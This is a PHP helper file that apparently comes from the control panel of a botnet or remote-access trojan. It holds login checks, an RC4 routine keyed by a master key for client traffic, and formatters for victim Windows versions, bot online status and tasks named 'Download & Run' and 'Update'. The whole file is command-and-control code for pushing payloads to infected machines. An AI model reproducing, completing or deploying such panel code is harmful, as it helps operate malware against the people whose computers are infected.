<?php
include_once("config.php");

function check_user_logged()
{
    if(isset($_SESSION["USER_LOGGED"]) && $_SESSION["USER_LOGGED"] == LOGIN_USERNAME) {
        return true;
    }
    return false;
}

function check_user_logged_or_login()
{
    if(!check_user_logged()) {
        header("Location: login.php");
        exit();
    }
}

function rc4($data, $size)
{
    $ctx = array();
    $out = "";
    $k = pack("H*", MASTER_KEY);

    if($size > 0)
    {
        for ($i = 0; $i < 256; $i++) {
            $ctx[$i] = $i;
        }

        $i1 = 0;
        for ($i = 0; $i < 256; $i++) 
        {
            $i1 = ($i1 + $ctx[$i] + ord($k[$i % MASTER_KEY_SIZE])) % 256;
            $x = $ctx[$i];
            $ctx[$i] = $ctx[$i1];
            $ctx[$i1] = $x;
        }

        $i1 = 0;
        $i2 = 0;
        for ($i = 0; $i < $size; $i++) 
        {
            $i1 = ($i1 + 1) % 256;
            $i2 = ($i2 + $ctx[$i1]) % 256;
            $xch = $ctx[$i1];
            $ctx[$i1] = $ctx[$i2];
            $ctx[$i2] = $xch;
            $out .= chr(ord($data[$i]) ^ $ctx[($ctx[$i1] + $ctx[$i2]) % 256]);
        }
    }

    return $out;
}

function format_win_version($win_integer, $is_64b)
{
    $str = "Unknown";
    switch($win_integer)
    {
    case WINDOWS_XP: $str = "Windows XP"; break;
    case WINDOWS_VISTA: $str = "Windows Vista"; break;
    case WINDOWS_7: $str = "Windows 7"; break;
    case WINDOWS_8: $str = "Windows 8"; break;
    case WINDOWS_8_1: $str = "Windows 8.1"; break;
    case WINDOWS_10: $str = "Windows 10"; break;
    default:
        return "Unknown";
    }

    $str .= (($is_64b) ? " / x64" : " / x86");
    return $str;
}

function format_task_action_name($task_int)
{
    switch($task_int)
    {
    case TASK_DOWNLOAD_RUN: return "Download & Run";
    case TASK_UPDATE: return "Update";
    }
    return "";
}

function format_task_status($task_int)
{
    switch($task_int)
    {
        case TASK_ACTIVE: return "<span class=\"label label-success\">Active</span>";
        case TASK_UNACTIVE: return "<span class=\"label label-default\">Unactive</span>";
        case TASK_COMPLETED: return "<span class=\"label label-success\">Completed</span>";
    }
    return "";
}

function format_date($utime)
{
    return date("d/m/Y g:i A", $utime);
}

function format_status($cur_time, $seen_time, $interval)
{
    return (($seen_time + (60 * $interval)) >= $cur_time) ? 
        "<span class=\"label label-success\">Online</span>" : 
        "<span class=\"label label-default\">Offline</span>";
}

function format_ver($ver)
{
    return floor($ver / 100) . "." . ($ver % 100);
}

function parse_post($post, &$array)
{
    $arr = explode("&", $post);
    foreach($arr as $a)
    {
        $l = strlen($a);
        $i = strpos($a, "=");
        
        if($i !== FALSE && $i != 0)
        {
            if($i + 1 < $l)
                $array[substr($a, 0, $i)] = substr($a, $i + 1);
            else
                $array[substr($a, 0, $i)] = "";
        }
    }
}

?>
